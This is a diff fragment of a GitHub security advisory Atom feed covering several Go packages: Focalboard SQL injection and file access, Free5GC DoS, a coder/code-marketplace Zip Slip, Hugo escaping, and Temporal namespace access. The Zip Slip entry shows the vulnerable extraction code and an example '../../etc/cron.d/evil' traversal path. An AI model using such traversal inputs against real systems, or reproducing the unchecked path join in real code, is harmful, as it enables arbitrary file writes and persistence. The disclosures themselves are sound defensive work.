+<li><a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a></li>
+<li><a href="https://github.com/advisories/GHSA-jvpw-637p-h3pw">https://github.com/advisories/GHSA-jvpw-637p-h3pw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jvpw-637p-h3pw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-08T00:04:27.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[go.opentelemetry.io/otel/propagation] OpenTelemetry-Go: multi-value `baggage` header extraction causes excessive allocations (remote dos amplification)]]></title>
         <id>https://github.com/advisories/GHSA-mh2q-q3fh-2475</id>
@@ -1029,167 +1585,5 @@ oleh</p>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-03-30T16:16:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/focalboard] Focalboard doesn't validate file ownership when serving uploaded files]]></title>
-        <id>https://github.com/advisories/GHSA-vph7-r229-qxpf</id>
-        <link href="https://github.com/advisories/GHSA-vph7-r229-qxpf"/>
-        <updated>2026-04-06T15:08:48.000Z</updated>
-        <content type="html"><![CDATA[<p>** UNSUPPORTED WHEN ASSIGNED ** Focalboard version 8.0 fails to validate file ownership when serving uploaded files. This allows an authenticated attacker who knows a victim's fileID to read the content of the file. NOTE: Focalboard as a standalone product is not maintained and no fix will be issued.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28736">https://nvd.nist.gov/vuln/detail/CVE-2026-28736</a></li>
-<li><a href="https://github.com/mattermost-community/focalboard">https://github.com/mattermost-community/focalboard</a></li>
-<li><a href="https://github.com/advisories/GHSA-vph7-r229-qxpf">https://github.com/advisories/GHSA-vph7-r229-qxpf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vph7-r229-qxpf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-03T15:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/focalboard] Focalboard doesn't sanitize category IDs before incorporating them into dynamic SQL statements]]></title>
-        <id>https://github.com/advisories/GHSA-p32q-v29x-wq9r</id>
-        <link href="https://github.com/advisories/GHSA-p32q-v29x-wq9r"/>
-        <updated>2026-04-06T15:08:34.000Z</updated>
-        <content type="html"><![CDATA[<p>** UNSUPPORTED WHEN ASSIGNED ** Focalboard version 8.0 fails to sanitize category IDs before incorporating them into dynamic SQL statements when reordering categories. An attacker can inject a malicious SQL payload into the category id field, which is stored in the database and later executed unsanitized when the category reorder API processes the stored value. This Second-Order SQL Injection (Time-Based Blind) allows an authenticated attacker to exfiltrate sensitive data including password hashes of other users. NOTE: Focalboard as a standalone product is not maintained and no fix will be issued.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25773">https://nvd.nist.gov/vuln/detail/CVE-2026-25773</a></li>
-<li><a href="https://github.com/mattermost-community/focalboard">https://github.com/mattermost-community/focalboard</a></li>
-<li><a href="https://github.com/advisories/GHSA-p32q-v29x-wq9r">https://github.com/advisories/GHSA-p32q-v29x-wq9r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p32q-v29x-wq9r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-03T15:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/amf] Free5GC AMF is vulnerable to DoS through its HandleRegistrationComplete function]]></title>
-        <id>https://github.com/advisories/GHSA-xq44-64rg-8g3h</id>
-        <link href="https://github.com/advisories/GHSA-xq44-64rg-8g3h"/>
-        <updated>2026-04-06T05:11:03.000Z</updated>
-        <content type="html"><![CDATA[<p>A weakness has been identified in Free5GC 4.1.0. Affected is the function HandleRegistrationComplete of the file internal/gmm/handler.go of the component AMF. Executing a manipulation can lead to denial of service. The attack may be performed from remote. This patch is called 52e9386401ce56ea773c5aa587d4cdf7d53da799. It is best practice to apply a patch to resolve this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4531">https://nvd.nist.gov/vuln/detail/CVE-2026-4531</a></li>
-<li><a href="https://github.com/free5gc/free5gc/issues/792">https://github.com/free5gc/free5gc/issues/792</a></li>
-<li><a href="https://github.com/free5gc/amf/pull/198">https://github.com/free5gc/amf/pull/198</a></li>
-<li><a href="https://github.com/free5gc/amf/commit/52e9386401ce56ea773c5aa587d4cdf7d53da799">https://github.com/free5gc/amf/commit/52e9386401ce56ea773c5aa587d4cdf7d53da799</a></li>
-<li><a href="https://vuldb.com/?ctiid.352319">https://vuldb.com/?ctiid.352319</a></li>
-<li><a href="https://vuldb.com/?id.352319">https://vuldb.com/?id.352319</a></li>
-<li><a href="https://vuldb.com/?submit.774073">https://vuldb.com/?submit.774073</a></li>
-<li><a href="https://github.com/advisories/GHSA-xq44-64rg-8g3h">https://github.com/advisories/GHSA-xq44-64rg-8g3h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xq44-64rg-8g3h</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-22T03:30:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coder/code-marketplace] Code Extension Marketplace: Zip Slip Path Traversal]]></title>
-        <id>https://github.com/advisories/GHSA-8x9r-hvwg-c55h</id>
-        <link href="https://github.com/advisories/GHSA-8x9r-hvwg-c55h"/>
-        <updated>2026-04-07T14:21:36.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="zip-slip-path-traversal-in-codercode-marketplace">Zip Slip Path Traversal in coder/code-marketplace</h1>
-<h2 id="summary">Summary</h2>
-<p>A Zip Slip (CWE-22) vulnerability in <code>coder/code-marketplace</code> ≤ v2.4.1 allowed a malicious VSIX file to write arbitrary files outside the extension directory. <code>ExtractZip</code> passed raw zip entry names to a callback that wrote files via <code>filepath.Join</code> with no boundary check; <code>filepath.Join</code> resolved <code>..</code> components but did not prevent the result from escaping the base path.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>ExtractZip</code> passed the raw, attacker-controlled <code>zf.Name</code> to a caller-supplied callback:</p>
-<pre><code class="language-go">return false, fn(zf.Name, zr)  // zf.Name not sanitized
-</code></pre>
-<p><code>AddExtension</code> constructed the output path with <code>filepath.Join</code> and no boundary check:</p>
-<pre><code class="language-go">path := filepath.Join(dir, name)              // zip loop
-path := filepath.Join(dir, file.RelativePath) // extra files loop
-</code></pre>
-<p><code>filepath.Clean</code> resolved <code>..</code> lexically but did not confine the result to <code>dir</code>:</p>
-<pre><code>filepath.Join("/srv/ext/pub/1.0", "../../../../etc/cron.d/evil")
-  → "/etc/cron.d/evil"
-</code></pre>
-<h2 id="attack-scenario">Attack Scenario</h2>
-<p>An authenticated user (any upload-capable role) would submit a VSIX containing path-traversal entries.</p>
-<p>On extraction, files would land at attacker-chosen paths writable by the marketplace process, enabling persistence (cron/init injection), SSH key injection, <code>ld.so.preload</code> hijacking, or binary overwrite depending on process privileges.</p>
-<h2 id="fix">Fix</h2>
-<p>Addressed in <a href="https://github.com/coder/code-marketplace/releases/tag/v2.4.2">https://github.com/coder/code-marketplace/releases/tag/v2.4.2</a></p>
-<h2 id="recognition">Recognition</h2>
-<p>Coder would like to thank <a href="https://www.linkedin.com/in/vamsi-k-5419632a9/">Kandlaguduru Vamsi</a> for responsibly disclosing this issue in accordance with <a href="https://coder.com/security/policy">https://coder.com/security/policy</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/coder/code-marketplace/security/advisories/GHSA-8x9r-hvwg-c55h">https://github.com/coder/code-marketplace/security/advisories/GHSA-8x9r-hvwg-c55h</a></li>
-<li><a href="https://github.com/coder/code-marketplace/commit/988440dee05fceef8400ed725badc604dbf90792">https://github.com/coder/code-marketplace/commit/988440dee05fceef8400ed725badc604dbf90792</a></li>
-<li><a href="https://github.com/coder/code-marketplace/releases/tag/v2.4.2">https://github.com/coder/code-marketplace/releases/tag/v2.4.2</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35454">https://nvd.nist.gov/vuln/detail/CVE-2026-35454</a></li>
-<li><a href="https://github.com/advisories/GHSA-8x9r-hvwg-c55h">https://github.com/advisories/GHSA-8x9r-hvwg-c55h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8x9r-hvwg-c55h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-04T06:26:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/gohugoio/hugo] Hugo: Certain markdown links are not properly escaped]]></title>
-        <id>https://github.com/advisories/GHSA-mcv8-8m8x-48pg</id>
-        <link href="https://github.com/advisories/GHSA-mcv8-8m8x-48pg"/>
-        <updated>2026-04-06T23:42:25.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Links and image links in the default markdown to HTML renderer are not properly escaped. Hugo users who trust their Markdown content or have custom render hooks for links and images are not affected.</p>
-<h3 id="patches">Patches</h3>
-<p>Patched in  v0.159.2</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Create custom render hooks for links and images in a Hugo theme/project.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gohugoio/hugo/security/advisories/GHSA-mcv8-8m8x-48pg">https://github.com/gohugoio/hugo/security/advisories/GHSA-mcv8-8m8x-48pg</a></li>
-<li><a href="https://github.com/gohugoio/hugo/commit/479fe6c654937a850b65e74551dc4e857d52898f">https://github.com/gohugoio/hugo/commit/479fe6c654937a850b65e74551dc4e857d52898f</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35166">https://nvd.nist.gov/vuln/detail/CVE-2026-35166</a></li>
-<li><a href="https://github.com/advisories/GHSA-mcv8-8m8x-48pg">https://github.com/advisories/GHSA-mcv8-8m8x-48pg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mcv8-8m8x-48pg</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-03T23:38:19.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[go.temporal.io/server] Temporal Server: attacker-controlled namespace could signal, delete, and reset workflows or activities in a victim namespace on the same cluster]]></title>
-        <id>https://github.com/advisories/GHSA-xpg8-3hhp-p7w8</id>
-        <link href="https://github.com/advisories/GHSA-xpg8-3hhp-p7w8"/>
-        <updated>2026-04-03T23:25:39.000Z</updated>
-        <content type="html"><![CDATA[<p>A writer role user in an attacker-controlled namespace could signal, delete, and reset workflows or activities in a victim namespace on the same cluster. Exploitation requires the attacker to know or guess specific victim workflow ID(s) and, for signal operations, signal names. This was due to a bug introduced in Temporal Server v1.29.0 which inadvertently allowed an attacker to control the namespace name value instead of using the server's own trusted name value within the batch activity code. The batch activity validated the namespace ID but did not cross-check the namespace name against the worker's bound namespace, allowing the per-namespace worker's privileged credentials to operate on an arbitrary namespace. Exploitation requires a server configuration where internal components have cross-namespace authorization, such as deployment of the internal-frontend service or equivalent TLS-based authorization for internal identities.</p>
-<p>This vulnerability also impacted Temporal Cloud when the attacker and victim namespaces were on the same cell, with the same preconditions as self-hosted clusters.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5199">https://nvd.nist.gov/vuln/detail/CVE-2026-5199</a></li>
-<li><a href="https://github.com/temporalio/temporal/releases/tag/v1.29.5">https://github.com/temporalio/temporal/releases/tag/v1.29.5</a></li>
-<li><a href="https://github.com/temporalio/temporal/releases/tag/v1.30.3">https://github.com/temporalio/temporal/releases/tag/v1.30.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-xpg8-3hhp-p7w8">https://github.com/advisories/GHSA-xpg8-3hhp-p7w8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xpg8-3hhp-p7w8</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-04-01T18:36:38.000Z</published>
     </entry>
 </feed>
